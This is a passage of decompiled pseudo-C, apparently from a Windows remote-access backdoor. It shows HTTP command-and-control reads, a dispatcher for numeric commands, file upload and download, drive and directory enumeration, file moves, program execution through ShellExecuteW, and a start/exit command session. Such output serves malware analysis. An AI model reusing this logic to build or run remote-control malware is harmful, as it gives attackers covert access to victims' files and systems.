    puVar13 = (undefined4 *)(pcVar15 + -uVar8);
    puVar16 = (undefined4 *)((int)puVar16 + -1);
    for (uVar9 = uVar8 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
      *puVar16 = *puVar13;
      puVar13 = puVar13 + 1;
      puVar16 = puVar16 + 1;
    }
    iVar6 = iVar6 + -1;
    for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
      *(undefined *)puVar16 = *(undefined *)puVar13;
      puVar13 = (undefined4 *)((int)puVar13 + 1);
      puVar16 = (undefined4 *)((int)puVar16 + 1);
    }
    if (iVar6 == 0) {
      uStack0000002a = 0x34;
      uVar11 = (uint)param_5[4];
      uVar8 = (uint)param_5[2];
      uVar9 = (uint)*param_5;
      DVar7 = GetCurrentProcessId();
      FUN_004047b7(extraout_ECX + 0x556,&param_7,pbVar1[1],pbVar1[3],pbVar1[5],DVar7,uVar9,uVar8,
                   uVar11);
      return 1;
    }
  } while( true );
}



undefined4 __thiscall FUN_004016a0(int param_1_00,LPCWSTR param_1)

{
  HANDLE hFile;
  DWORD DVar1;
  undefined4 uVar2;
  HANDLE hFileMappingObject;
  LPVOID lpBaseAddress;
  
  hFile = CreateFileW(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    DVar1 = GetLastError();
    wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar1);
    uVar2 = FUN_004038d0((LPWSTR)(param_1_00 + 0x6b4),0,0);
    return uVar2;
  }
  DVar1 = GetFileSize(hFile,(LPDWORD)&param_1);
  if (param_1 == (LPCWSTR)0x0) {
    if (DVar1 < 0x200001) {
      DVar1 = GetFileSize(hFile,(LPDWORD)0x0);
      hFileMappingObject = CreateFileMappingW(hFile,(LPSECURITY_ATTRIBUTES)0x0,8,0,0,(LPCWSTR)0x0);
      lpBaseAddress = MapViewOfFile(hFileMappingObject,1,0,0,0);
      if (lpBaseAddress != (LPVOID)0x0) {
        uVar2 = FUN_004038d0(param_1_00 + 0x6b4,lpBaseAddress,DVar1);
        UnmapViewOfFile(lpBaseAddress);
        CloseHandle(hFileMappingObject);
        CloseHandle(hFile);
        return uVar2;
      }
      DVar1 = GetLastError();
    }
    else {
      DVar1 = 0xe;
    }
  }
  else {
    DVar1 = 0xd;
  }
  wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar1);
  uVar2 = FUN_004038d0((LPWSTR)(param_1_00 + 0x6b4),0,0);
  CloseHandle(hFile);
  return uVar2;
}



undefined4 __thiscall FUN_004017e0(int param_1_00,LPCWSTR param_1)

{
  HANDLE hFile;
  DWORD DVar1;
  undefined4 uVar2;
  
  hFile = CreateFileW(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    DVar1 = GetLastError();
    wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar1);
    uVar2 = FUN_004038d0((LPWSTR)(param_1_00 + 0x6b4),0,0);
    return uVar2;
  }
  DVar1 = GetFileSize(hFile,(LPDWORD)&param_1);
  if (param_1 == (LPCWSTR)0x0) {
    if (DVar1 < 0xa00001) {
      wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),0);
      uVar2 = FUN_00403a90((LPWSTR)(param_1_00 + 0x6b4),hFile,DVar1);
      CloseHandle(hFile);
      return uVar2;
    }
    uVar2 = 0xe;
  }
  else {
    uVar2 = 0xd;
  }
  wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),uVar2);
  uVar2 = FUN_004038d0((LPWSTR)(param_1_00 + 0x6b4),0,0);
  CloseHandle(hFile);
  return uVar2;
}



undefined4 FUN_004018d0(DWORD param_1)

{
  HANDLE hObject;
  int iVar1;
  undefined4 uVar2;
  BOOL BVar3;
  int extraout_ECX;
  DWORD DVar4;
  undefined *lpBuffer;
  DWORD nNumberOfBytesToWrite;
  LPCWSTR in_stack_0000200c;
  
  FUN_00404830();
  nNumberOfBytesToWrite = 0;
  param_1 = 0;
  DVar4 = 0;
  hObject = CreateFileW(in_stack_0000200c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,1,0x80,(HANDLE)0x0
                       );
  if (hObject == (HANDLE)0xffffffff) {
    DVar4 = GetLastError();
    wsprintfW((LPWSTR)(extraout_ECX + 0x6b4),(LPCWSTR)(extraout_ECX + 0x5aa),DVar4);
  }
  iVar1 = FUN_004038d0(extraout_ECX + 0x6b4,0,0);
  if (iVar1 == 0) {
    return 0;
  }
  if (hObject == (HANDLE)0xffffffff) {
    return 1;
  }
  *(undefined4 *)(extraout_ECX + 0x21c) = 0;
  do {
    do {
      iVar1 = InternetReadFile(*(undefined4 *)(extraout_ECX + 0xc),&stack0x00000008,0x2000,
                               &stack0x00000000);
      if ((iVar1 == 0) || (nNumberOfBytesToWrite == 0)) {
        if (hObject != (HANDLE)0xffffffff) {
          CloseHandle(hObject);
        }
        if (DVar4 != 0) {
          wsprintfW((LPWSTR)(extraout_ECX + 0x6b4),(LPCWSTR)(extraout_ECX + 0x5aa),DVar4);
        }
        uVar2 = FUN_004038d0(extraout_ECX + 0x6b4,0,0);
        return uVar2;
      }
      uVar2 = FUN_004032c0(&stack0x00000008,nNumberOfBytesToWrite,
                           *(undefined4 *)(extraout_ECX + 0x21c));
      *(undefined4 *)(extraout_ECX + 0x21c) = uVar2;
      lpBuffer = &stack0x00000008;
    } while (hObject == (HANDLE)0xffffffff);
    do {
      if (nNumberOfBytesToWrite == 0) break;
      BVar3 = WriteFile(hObject,lpBuffer,nNumberOfBytesToWrite,&param_1,(LPOVERLAPPED)0x0);
      if (BVar3 == 0) {
        DVar4 = GetLastError();
        CloseHandle(hObject);
        hObject = (HANDLE)0xffffffff;
      }
      lpBuffer = lpBuffer + param_1;
      nNumberOfBytesToWrite = nNumberOfBytesToWrite - param_1;
    } while (hObject != (HANDLE)0xffffffff);
  } while( true );
}



undefined4 FUN_00401a50(void)

{
  undefined uVar1;
  int iVar2;
  uint uVar3;
  UINT UVar4;
  undefined4 uVar5;
  HANDLE hFindFile;
  BOOL BVar6;
  int extraout_ECX;
  undefined4 *puVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  uint uVar10;
  uint param_11;
  WCHAR param_12;
  
  FUN_00404830();
  iVar2 = FUN_00404809();
  if (iVar2 == 0) {
    uVar3 = GetLogicalDrives();
    iVar2 = 0;
    uVar10 = DAT_0040f3b0;
    for (; uVar3 != 0; uVar3 = uVar3 >> 1) {
      if ((uVar3 & 1) != 0) {
        UVar4 = GetDriveTypeA(&stack0x00000000);
        switch(UVar4) {
        case 2:
          uVar1 = 0x33;
          break;
        case 3:
          uVar1 = 0x31;
          break;
        case 4:
          uVar1 = 0x32;
          break;
        case 5:
          uVar1 = 0x34;
          break;
        case 6:
          uVar1 = 0x35;
          break;
        default:
          uVar1 = 0x36;
        }
        (&stack0x00000464)[iVar2] = uVar1;
        *(short *)(&stack0x00000465 + iVar2) = (short)uVar10;
        iVar2 = iVar2 + 3;
      }
      uVar10 = uVar10 & 0xffffff00 | (uint)(byte)((char)uVar10 + 1);
    }
    uVar5 = FUN_004038d0();
    return uVar5;
  }
  FUN_0040485f();
  puVar7 = (undefined4 *)&stack0x00000464;
  hFindFile = FindFirstFileW((LPCWSTR)&stack0x0000025c,(LPWIN32_FIND_DATAW)&stack0x0000000c);
  if (hFindFile == (HANDLE)0xffffffff) {
    GetLastError();
    wsprintfW((LPWSTR)(extraout_ECX + 0x6b4),(LPCWSTR)(extraout_ECX + 0x5aa));
    uVar5 = FUN_004038d0();
    return uVar5;
  }
  do {
    if (param_12 != L'.') {
      iVar2 = FUN_00404809();
      param_11 = iVar2 * 2 + 2;
      puVar8 = (undefined4 *)&stack0x0000000c;
      puVar9 = puVar7;
      for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {
        *puVar9 = *puVar8;
        puVar8 = puVar8 + 1;
        puVar9 = puVar9 + 1;
      }
      puVar8 = (undefined4 *)&stack0x00000038;
      puVar9 = puVar7 + 10;
      for (uVar3 = param_11 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar9 = *puVar8;
        puVar8 = puVar8 + 1;
        puVar9 = puVar9 + 1;
      }
      for (uVar3 = param_11 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
        *(undefined *)puVar9 = *(undefined *)puVar8;
        puVar8 = (undefined4 *)((int)puVar8 + 1);
        puVar9 = (undefined4 *)((int)puVar9 + 1);
      }
      puVar7 = (undefined4 *)((int)(puVar7 + 10) + param_11);
      if ((undefined *)0x2000 < (undefined *)((int)puVar7 + (0x250 - (int)&stack0x00000464))) {
        iVar2 = FUN_004038d0();
        if (iVar2 == 0) {
          FindClose(hFindFile);
          return 0;
        }
        iVar2 = FUN_004026f0();
        if ((iVar2 == 0) || (*(short *)(extraout_ECX + 0x1100) != 0)) {
          FindClose(hFindFile);
          *(undefined *)(extraout_ECX + 0x1120) = 1;
          return 1;
        }
        puVar7 = (undefined4 *)&stack0x00000464;
      }
    }
    BVar6 = FindNextFileW(hFindFile,(LPWIN32_FIND_DATAW)&stack0x0000000c);
    if (BVar6 == 0) {
      FindClose(hFindFile);
      iVar2 = FUN_004038d0();
      if (iVar2 != 0) {
        return 1;
      }
      GetLastError();
      return 0;
    }
  } while( true );
}



void __thiscall FUN_00401cf0(int param_1_00,undefined4 param_1,LPCWSTR param_2,int param_3)

{
  int iVar1;
  HANDLE hFindFile;
  DWORD DVar2;
  uint uVar3;
  int iVar4;
  WCHAR *pWVar5;
  DWORD *pDVar6;
  undefined4 uVar7;
  _WIN32_FIND_DATAW local_250;
  
  iVar4 = 0;
  if (param_3 == 0) {
    uVar7 = 2;
  }
  else {
    uVar7 = 1;
  }
  iVar1 = FUN_00402fa0(uVar7,param_1,param_2,0x614);
  if (iVar1 == 0) {
    DVar2 = GetLastError();
    wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar2);
    FUN_004038d0((LPWSTR)(param_1_00 + 0x6b4),0,0);
    return;
  }
  hFindFile = FindFirstFileW(param_2,&local_250);
  if (hFindFile != (HANDLE)0xffffffff) {
    FindClose(hFindFile);
    iVar4 = FUN_00404809(local_250.cFileName);
    local_250.dwReserved0 = iVar4 * 2 + 2;
    iVar4 = iVar4 * 2 + 0x2a;
    pWVar5 = local_250.cFileName;
    pDVar6 = &local_250.dwReserved1;
    for (uVar3 = local_250.dwReserved0 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *pDVar6 = *(DWORD *)pWVar5;
      pWVar5 = pWVar5 + 2;
      pDVar6 = pDVar6 + 1;
    }
    for (uVar3 = local_250.dwReserved0 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)pDVar6 = *(undefined *)pWVar5;
      pWVar5 = (WCHAR *)((int)pWVar5 + 1);
      pDVar6 = (DWORD *)((int)pDVar6 + 1);
    }
  }
  FUN_004038d0(param_1_00 + 0x6b4,&local_250,iVar4);
  return;
}



void __thiscall FUN_00401de0(int param_1_00,undefined4 param_1)

{
  int iVar1;
  DWORD DVar2;
  
  iVar1 = FUN_00402fa0(3,param_1,&DAT_00412294,0x614);
  if (iVar1 == 0) {
    DVar2 = GetLastError();
    if (DVar2 != 0) {
      wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar2);
    }
  }
  FUN_004038d0(param_1_00 + 0x6b4,0,0);
  return;
}



void __thiscall FUN_00401e40(int param_1_00,LPCWSTR param_1,LPCWSTR param_2)

{
  BOOL BVar1;
  DWORD DVar2;
  
  BVar1 = MoveFileW(param_1,param_2);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar2);
  }
  FUN_004038d0(param_1_00 + 0x6b4,0,0);
  return;
}



void __thiscall FUN_00401e90(int param_1_00,LPCWSTR param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  HANDLE hFindFile;
  int iVar3;
  uint uVar4;
  WCHAR *pWVar5;
  DWORD *pDVar6;
  _WIN32_FIND_DATAW local_250;
  
  BVar1 = CreateDirectoryW(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar2);
  }
  else {
    hFindFile = FindFirstFileW(param_1,&local_250);
    if (hFindFile != (HANDLE)0xffffffff) {
      FindClose(hFindFile);
      iVar3 = FUN_00404809(local_250.cFileName);
      local_250.dwReserved0 = iVar3 * 2 + 2;
      pWVar5 = local_250.cFileName;
      pDVar6 = &local_250.dwReserved1;
      for (uVar4 = local_250.dwReserved0 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
        *pDVar6 = *(DWORD *)pWVar5;
        pWVar5 = pWVar5 + 2;
        pDVar6 = pDVar6 + 1;
      }
      for (uVar4 = local_250.dwReserved0 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
        *(undefined *)pDVar6 = *(undefined *)pWVar5;
        pWVar5 = (WCHAR *)((int)pWVar5 + 1);
        pDVar6 = (DWORD *)((int)pDVar6 + 1);
      }
      FUN_004038d0(param_1_00 + 0x6b4,&local_250,iVar3 * 2 + 0x2a);
      return;
    }
  }
  FUN_004038d0(param_1_00 + 0x6b4,0,0);
  return;
}



void __thiscall FUN_00401f50(int param_1_00,LPCWSTR param_1,LPCWSTR param_2)

{
  HINSTANCE pHVar1;
  DWORD DVar2;
  
  pHVar1 = ShellExecuteW((HWND)0x0,u_open_0040f3b8,param_1,param_2,param_1,0);
  if ((int)pHVar1 < 0x21) {
    DVar2 = GetLastError();
    wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar2);
  }
  FUN_004038d0(param_1_00 + 0x6b4,0,0);
  return;
}



void __thiscall FUN_00401fb0(int param_1_00,undefined4 param_1)

{
  bool bVar1;
  int iVar2;
  DWORD DVar3;
  undefined4 *puVar4;
  int local_804;
  undefined4 local_800 [512];
  
  bVar1 = true;
  iVar2 = FUN_004048ce(param_1,u_exit_0040f3ec);
  if (iVar2 == 0) {
    iVar2 = FUN_004035e0();
    if (iVar2 == 0) {
      DVar3 = GetLastError();
      wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar3);
    }
    FUN_004038d0(param_1_00 + 0x6b4,0,0);
    return;
  }
  iVar2 = FUN_004048ce(param_1,u_start_0040f3dc);
  if ((iVar2 == 0) || (iVar2 = FUN_004048ce(param_1,u_restart_0040f3c8), iVar2 == 0)) {
    FUN_004035e0();
    iVar2 = FUN_004034d0();
    if (iVar2 != 0) {
      bVar1 = false;
      goto LAB_00402076;
    }
    DVar3 = GetLastError();
  }
  else {
LAB_00402076:
    if (*(char *)(param_1_00 + 0xee0) == '\0') {
      DVar3 = 0x15;
    }
    else {
      puVar4 = local_800;
      for (iVar2 = 0x200; iVar2 != 0; iVar2 = iVar2 + -1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      if (bVar1) {
        wsprintfA((LPSTR)local_800,&DAT_0040f3c4,param_1);
        iVar2 = FUN_00403660(local_800);
        if (iVar2 == 0) {
          DVar3 = GetLastError();
          goto LAB_0040215e;
        }
      }
      local_804 = 0x800;
      iVar2 = FUN_004036a0(local_800,&local_804);
      if ((iVar2 != 0) && (local_804 != 0)) {
        wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),0);
        puVar4 = local_800;
        iVar2 = local_804;
        goto LAB_0040216c;
      }
      DVar3 = WaitForSingleObject(*(HANDLE *)(param_1_00 + 0xed0),3);
      if (DVar3 == 0) {
        DVar3 = 0x15;
      }
      else {
        DVar3 = 0;
      }
    }
  }
LAB_0040215e:
  wsprintfW((LPWSTR)(param_1_00 + 0x6b4),(LPCWSTR)(param_1_00 + 0x5aa),DVar3);
  puVar4 = (undefined4 *)0x0;
  iVar2 = 0;
LAB_0040216c:
  FUN_004038d0(param_1_00 + 0x6b4,puVar4,iVar2);
  return;
}



void __fastcall FUN_00402190(int param_1)

{
  int iVar1;
  DWORD DVar2;
  
  iVar1 = FUN_004035e0();
  if (iVar1 == 0) {
    DVar2 = GetLastError();
    wsprintfW((LPWSTR)(param_1 + 0x6b4),(LPCWSTR)(param_1 + 0x5aa),DVar2);
  }
  FUN_004038d0(param_1 + 0x6b4,0,0);
  return;
}



undefined4 __fastcall FUN_004021e0(int param_1)

{
  LPWSTR pWVar1;
  undefined4 uVar2;
  int iVar3;
  DWORD DVar4;
  undefined2 extraout_var;
  undefined4 unaff_EBX;
  undefined4 unaff_retaddr;
  
  InternetCloseHandle(*(undefined4 *)(param_1 + 0xc));
  InternetCloseHandle(*(undefined4 *)(param_1 + 8));
  uVar2 = FUN_0040494e(unaff_retaddr,0,10);
  FUN_00403890(unaff_EBX,uVar2);
  GetLastError();
  pWVar1 = (LPWSTR)(param_1 + 0x6b4);
  iVar3 = FUN_004038d0(pWVar1,0,0);
  if (iVar3 == 0) {
    GetLastError();
    DVar4 = GetLastError();
    wsprintfW(pWVar1,(LPCWSTR)(param_1 + 0x5aa),DVar4);
    InternetCloseHandle(*(undefined4 *)(param_1 + 0xc));
    *(undefined4 *)(param_1 + 0xc) = 0;
    InternetCloseHandle(*(undefined4 *)(param_1 + 8));
    FUN_00403890(&DAT_0040f0a8 + *(int *)(param_1 + 0xeb4) * 0x12,
                 CONCAT22(extraout_var,
                          *(undefined2 *)(&DAT_0040f0e8 + *(int *)(param_1 + 0xeb4) * 0x48)));
    uVar2 = FUN_004038d0(pWVar1,0,0);
    return uVar2;
  }
  return 1;
}



// WARNING: Removing unreachable block (ram,0x0040233e)
// WARNING: Removing unreachable block (ram,0x00402350)
// WARNING: Removing unreachable block (ram,0x00402371)
// WARNING: Removing unreachable block (ram,0x00402369)
// WARNING: Removing unreachable block (ram,0x0040238a)

void FUN_004022a0(void)

{
  LPWSTR pWVar1;
  HANDLE hFile;
  DWORD DVar2;
  int extraout_ECX;
  LPCWSTR in_stack_0000100c;
  
  FUN_00404830();
  pWVar1 = (LPWSTR)(extraout_ECX + 0x6b4);
  wsprintfW(pWVar1,(LPCWSTR)(extraout_ECX + 0x5aa),0x30e);
  hFile = CreateFileW(in_stack_0000100c,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    DVar2 = GetLastError();
    wsprintfW(pWVar1,(LPCWSTR)(extraout_ECX + 0x5aa),DVar2);
  }
  else {
    ReadFile(hFile,&stack0x00000008,0x1000,(LPDWORD)&stack0x00000000,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
  }
  FUN_004038d0(pWVar1,0,0);
  return;
}



// WARNING: Removing unreachable block (ram,0x004025e6)
// WARNING: Removing unreachable block (ram,0x00402570)
// WARNING: Removing unreachable block (ram,0x00402538)
// WARNING: Removing unreachable block (ram,0x0040254c)
// WARNING: Removing unreachable block (ram,0x00402566)
// WARNING: Removing unreachable block (ram,0x00402568)
// WARNING: Removing unreachable block (ram,0x004025ae)
// WARNING: Removing unreachable block (ram,0x004025c2)
// WARNING: Removing unreachable block (ram,0x004025dc)
// WARNING: Removing unreachable block (ram,0x004025de)
// WARNING: Removing unreachable block (ram,0x0040264d)
// WARNING: Removing unreachable block (ram,0x00402662)
// WARNING: Removing unreachable block (ram,0x0040267c)
// WARNING: Removing unreachable block (ram,0x0040267e)
// WARNING: Removing unreachable block (ram,0x00402686)
// WARNING: Removing unreachable block (ram,0x004026a2)

void FUN_004023c0(void)

{
  int iVar1;
  int extraout_ECX;
  
  FUN_00404830();
  FUN_00402e60();
  iVar1 = InternetConnectW();
  if (iVar1 == 0) {
    GetLastError();
    wsprintfW((LPWSTR)(extraout_ECX + 0x6b4),(LPCWSTR)(extraout_ECX + 0x5aa));
  }
  else {
    iVar1 = HttpOpenRequestW();
    if (iVar1 == 0) {
      GetLastError();
      wsprintfW((LPWSTR)(extraout_ECX + 0x6b4),(LPCWSTR)(extraout_ECX + 0x5aa));
      InternetCloseHandle();
      FUN_004038d0();
      return;
    }
    iVar1 = HttpSendRequestW();
    if (iVar1 == 0) {
      GetLastError();
      GetLastError();
      wsprintfW((LPWSTR)(extraout_ECX + 0x6b4),(LPCWSTR)(extraout_ECX + 0x5aa));
      InternetCloseHandle();
      InternetCloseHandle();
      FUN_004038d0();
      return;
    }
    FUN_00403c00();
    FUN_00404b0a();
    FUN_00403c00();
    FUN_00404b0a();
    wsprintfW((LPWSTR)(extraout_ECX + 0x6b4),(LPCWSTR)(extraout_ECX + 0x5aa));
    InternetReadFile();
    InternetCloseHandle();
    InternetCloseHandle();
  }
  FUN_004038d0();
  return;
}



undefined4 __fastcall FUN_004026f0(int param_1)

{
  undefined4 uVar1;
  void *pvVar2;
  int iVar3;
  undefined2 extraout_var;
  int iVar4;
  int unaff_EDI;
  int *piVar5;
  size_t *psVar6;
  int iStack_424;
  char *pcStack_420;
  undefined4 uStack_41c;
  undefined4 *puStack_418;
  undefined4 local_404 [257];
  
  local_404[0] = 0;
  piVar5 = (int *)(param_1 + 0x1114);
  iVar4 = 3;
  do {
    puStack_418 = (undefined4 *)*piVar5;
    if (puStack_418 != (undefined4 *)0x0) {
      uStack_41c = 0x40271b;
      FUN_00404b0a();
    }
    piVar5 = piVar5 + 1;
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
  iStack_424 = *(int *)(param_1 + 0xc);
  puStack_418 = local_404;
  uStack_41c = 0x24;
  *(undefined *)(param_1 + 0x1120) = 0;
  pcStack_420 = (char *)(param_1 + 0x10f0);
  iVar4 = InternetReadFile();
  if (iVar4 != 0) {
    if ((unaff_EDI == 0x24) && (*(char *)(param_1 + 0x10f0) == -1)) {
      iVar4 = 0;
      *(undefined4 *)(param_1 + 0x21c) = 0;
      uVar1 = FUN_004032c0(param_1 + 0x1100,0x14,0);
      *(undefined4 *)(param_1 + 0x21c) = uVar1;
      psVar6 = (size_t *)(param_1 + 0x1108);
      do {
        if (*psVar6 == 0) {
          psVar6[3] = 0;
        }
        else {
          pvVar2 = _malloc(*psVar6);
          psVar6[3] = (size_t)pvVar2;
          if (pvVar2 != (void *)0x0) {
            iVar3 = InternetReadFile(*(undefined4 *)(param_1 + 0xc),pvVar2,*psVar6,&stack0xfffffbec)
            ;
            if (iVar3 == 0) {
              return 0;
            }
            uVar1 = FUN_004032c0(psVar6[3],*psVar6,*(undefined4 *)(param_1 + 0x21c));
            *(undefined4 *)(param_1 + 0x21c) = uVar1;
          }
        }
        iVar4 = iVar4 + 1;
        psVar6 = psVar6 + 1;
      } while (iVar4 < 3);
      iVar4 = InternetReadFile(*(undefined4 *)(param_1 + 0xc),&stack0xfffffbf0,0x400,
                               &stack0xfffffbec);
      while ((iVar4 != 0 && (iStack_424 != 0))) {
        iVar4 = InternetReadFile(*(undefined4 *)(param_1 + 0xc),&pcStack_420,0x400,&iStack_424);
      }
      return 1;
    }
    InternetCloseHandle(*(undefined4 *)(param_1 + 0xc));
    *(undefined4 *)(param_1 + 0xc) = 0;
    InternetCloseHandle(*(undefined4 *)(param_1 + 8));
    InternetSetOptionW(*(undefined4 *)(param_1 + 4),0x27,0,0);
    FUN_00403890(&DAT_0040f0a8 + *(int *)(param_1 + 0xeb4) * 0x12,
                 CONCAT22(extraout_var,
                          *(undefined2 *)(&DAT_0040f0e8 + *(int *)(param_1 + 0xeb4) * 0x48)));
  }
  return 0;
}



undefined4 __fastcall FUN_00402890(int param_1)

{
  char cVar1;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  int iVar6;
  undefined2 extraout_var;
  uint uVar7;
  char *pcVar8;
  CHAR local_30c [260];
  WCHAR local_208 [260];
  
  if (*(int *)(param_1 + 0x6ac) == 0) {
    wsprintfW((LPWSTR)(param_1 + 0x6b4),(LPCWSTR)&DAT_0040f378);
  }
  else if (*(int *)(param_1 + 0x6ac) == 1) {
    wsprintfW((LPWSTR)(param_1 + 0x6b4),u__lo_s_to_sn__S_0040f424,&DAT_0040f444,&DAT_0040f44c,
              param_1 + 0x556);
  }
  iVar2 = FUN_004038d0(param_1 + 0x6b4,0,0);
  if (iVar2 == 0) {
    DVar3 = GetLastError();
    if (((DVar3 == 0x2733) || (DVar3 == 0x2ee7)) || (DVar3 == 0x2efd)) {
      InternetCloseHandle(*(undefined4 *)(param_1 + 0xc));
      *(undefined4 *)(param_1 + 0xc) = 0;
      InternetCloseHandle(*(undefined4 *)(param_1 + 8));
      InternetSetOptionW(*(undefined4 *)(param_1 + 4),0x27,0,0);
      FUN_00403890(&DAT_0040f0a8 + *(int *)(param_1 + 0xeb4) * 0x12,
                   CONCAT22(extraout_var,
                            *(undefined2 *)(&DAT_0040f0e8 + *(int *)(param_1 + 0xeb4) * 0x48)));
      FUN_004045bd(param_1 + 0x5aa,&DAT_0040f378);
      *(undefined4 *)(param_1 + 0x6ac) = 0;
      uVar4 = FUN_00402f50(0x4b0,0x4b0);
      *(undefined4 *)(param_1 + 0x10ec) = uVar4;
      return 0;
    }
  }
  else {
    do {
      if ((*(char *)(param_1 + 0x1120) == '\0') && (iVar2 = FUN_004026f0(), iVar2 == 0)) {
        return 0;
      }
      iVar2 = *(int *)(param_1 + 0x1114);
      uVar4 = *(undefined4 *)(param_1 + 0x1118);
      wsprintfW((LPWSTR)(param_1 + 0x5aa),(LPCWSTR)&DAT_0040f41c,*(undefined4 *)(param_1 + 0x111c));
      uVar5 = FUN_00402f50(6,6);
      *(undefined4 *)(param_1 + 0x10ec) = uVar5;
      if (0x66 < *(short *)(param_1 + 0x1100)) {
        wsprintfW((LPWSTR)(param_1 + 0x6b4),(LPWSTR)(param_1 + 0x5aa),0);
      }
      iVar6 = (int)*(short *)(param_1 + 0x1100);
      if (iVar6 < 0x131) {
        if (iVar6 == 0x130) {
          iVar2 = FUN_00401cf0(iVar2,uVar4,1);
        }
        else {
          switch(iVar6) {
          case 0x9b:
            iVar2 = FUN_004017e0(iVar2);
            break;
          case 0x9c:
          case 0x9d:
          case 0x9e:
          case 0x9f:
          case 0xa0:
          case 0xa1:
          case 0xa2:
          case 0xa3:
          case 0xa4:
          case 0xa5:
          case 0xa6:
          case 0xa7:
          case 0xa8:
          case 0xa9:
          case 0xaa:
          case 0xab:
          case 0xac:
          case 0xad:
          case 0xae:
          case 0xaf:
          case 0xb0:
          case 0xb1:
          case 0xb2:
          case 0xb3:
          case 0xb4:
          case 0xb5:
          case 0xb6:
          case 0xb7:
          case 0xb8:
          case 0xb9:
          case 0xba:
          case 0xbb:
          case 0xbc:
          case 0xbd:
          case 0xbe:
          case 0xbf:
          case 0xc0:
          case 0xc1:
          case 0xc2:
          case 0xc3:
          case 0xc4:
          case 0xc5:
          case 0xc6:
          case 199:
          case 200:
          case 0xc9:
          case 0xca:
          case 0xcb:
          case 0xcc:
          case 0xcd:
          case 0xce:
          case 0xcf:
          case 0xd0:
          case 0xd1:
          case 0xd2:
          case 0xd3:
          case 0xd4:
          case 0xd5:
          case 0xd6:
          case 0xd7:
          case 0xd8:
          case 0xd9:
          case 0xda:
          case 0xdb:
          case 0xdc:
          case 0xdd:
          case 0xde:
          case 0xdf:
          case 0xe0:
          case 0xe1:
          case 0xe2:
          case 0xe3:
          case 0xe4:
          case 0xe5:
          case 0xe6:
          case 0xe7:
          case 0xe8:
          case 0xe9:
          case 0xea:
          case 0xeb:
          case 0xec:
          case 0xed:
          case 0xee:
          case 0xef:
          case 0xf0:
          case 0xf1:
          case 0xf2:
          case 0xf3:
          case 0xf4:
          case 0xf5:
          case 0xf6:
          case 0xf7:
          case 0xf8:
          case 0xf9:
          case 0xfa:
          case 0xfb:
          case 0xfc:
          case 0xfd:
          case 0xfe:
          case 0xff:
          case 0x100:
          case 0x101:
          case 0x102:
          case 0x103:
          case 0x104:
          case 0x105:
          case 0x106:
          case 0x107:
          case 0x108:
          case 0x109:
          case 0x10a:
          case 0x10b:
          case 0x10c:
          case 0x10d:
          case 0x10e:
          case 0x10f:
          case 0x110:
          case 0x111:
          case 0x112:
          case 0x113:
          case 0x114:
          case 0x115:
          case 0x116:
          case 0x117:
          case 0x118:
          case 0x119:
          case 0x11a:
          case 0x11b:
          case 0x11c:
          case 0x11d:
          case 0x11e:
          case 0x11f:
          case 0x120:
          case 0x121:
          case 0x122:
          case 0x123:
          case 0x124:
          case 0x125:
          case 0x126:
          case 0x127:
          case 0x128:
          case 0x129:
          case 0x12a:
          case 299:
          case 300:
            goto switchD_00402c12_caseD_326;
          case 0x12d:
            iVar2 = FUN_00401a50(iVar2);
            break;
          case 0x12e:
            iVar2 = FUN_00401e90(uVar4);
            break;
          case 0x12f:
            iVar2 = FUN_00401cf0(iVar2,uVar4,0);
            break;
          default:
            switch(iVar6) {
            case 0:
switchD_00402a43_caseD_0:
              iVar2 = FUN_004038d0(param_1 + 0x6b4,0,0);
              break;
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
            case 6:
            case 7:
            case 8:
            case 9:
            case 10:
            case 0xb:
            case 0xc:
            case 0xd:
            case 0xe:
            case 0xf:
            case 0x10:
            case 0x11:
            case 0x12:
            case 0x13:
